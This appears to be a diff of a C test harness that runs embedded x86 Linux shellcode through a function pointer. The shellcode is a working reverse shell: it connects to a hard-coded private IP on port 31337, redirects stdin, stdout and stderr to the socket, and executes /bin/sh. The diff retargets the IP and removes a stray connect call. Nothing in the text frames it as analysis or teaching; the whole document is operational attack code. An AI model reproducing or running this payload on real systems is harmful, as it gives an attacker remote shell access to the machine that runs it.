@@ -14,14 +14,11 @@
 int main(int argc, char **argv)
 {
     struct sockaddr_in server;
-    struct sockaddr_in server_addr;
-    struct hostent *host;
+    struct sockaddr_in client;
     int sock;
     int new;
     int sockaddr_len = sizeof(struct sockaddr_in);
     
-    host = gethostbyname("127.0.0.1");
-
     if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
         perror("server socket: ");
@@ -32,15 +29,6 @@ int main(int argc, char **argv)
     server.sin_port = htons(31337);
     server.sin_addr.s_addr = INADDR_ANY;
     bzero(&server.sin_zero, 8); 
-
-    server_addr.sin_port = htons(31337);   
-    server_addr.sin_addr = *((struct in_addr *)host->h_addr);
-    
-    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) 
-    {
-        perror("Connect");
-            exit(1);
-    }
     
     if((bind(sock, (struct sockaddr *)&server, sockaddr_len)) == -1)
     {
@@ -61,17 +49,17 @@ int main(int argc, char **argv)
     }
 
     char *shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
-"\xb0\x66\xb3\x01\x51\x6a\x06\x6a"
-"\x01\x6a\x02\x89\xe1\xcd\x80\x89"
-"\xc6\xb0\x66\x31\xdb\xb3\x02\x68"
-"\xc0\xa8\x00\x0b\x66\x68\x7a\x69\x66\x53\xfe"
-"\xc3\x89\xe1\x6a\x10\x51\x56\x89"
-"\xe1\xcd\x80\x31\xc9\xb1\x03\xfe"
-"\xc9\xb0\x3f\xcd\x80\x75\xf8\x31"
-"\xc0\x52\x68\x6e\x2f\x73\x68\x68"
-"\x2f\x2f\x62\x69\x89\xe3\x52\x53"
-"\x89\xe1\x52\x89\xe2\xb0\x0b\xcd"
-"\x80";
+                      "\xb0\x66\xb3\x01\x51\x6a\x06\x6a"
+                      "\x01\x6a\x02\x89\xe1\xcd\x80\x89"
+                      "\xc6\xb0\x66\x31\xdb\xb3\x02\x68"
+                      "\xc0\xa8\x00\x0a\x66\x68\x7a\x69\x66\x53\xfe"
+                      "\xc3\x89\xe1\x6a\x10\x51\x56\x89"
+                      "\xe1\xcd\x80\x31\xc9\xb1\x03\xfe"
+                      "\xc9\xb0\x3f\xcd\x80\x75\xf8\x31"
+                      "\xc0\x52\x68\x6e\x2f\x73\x68\x68"
+                      "\x2f\x2f\x62\x69\x89\xe3\x52\x53"
+                      "\x89\xe1\x52\x89\xe2\xb0\x0b\xcd"
+                      "\x80";
 
     close(new);
     close(sock);
@@ -79,7 +67,6 @@ int main(int argc, char **argv)
     printf("Executing Shellcode...\n");
     int (*ret)() = (int(*)())shellcode;
     ret();
-    
 
     return 0;       
 }
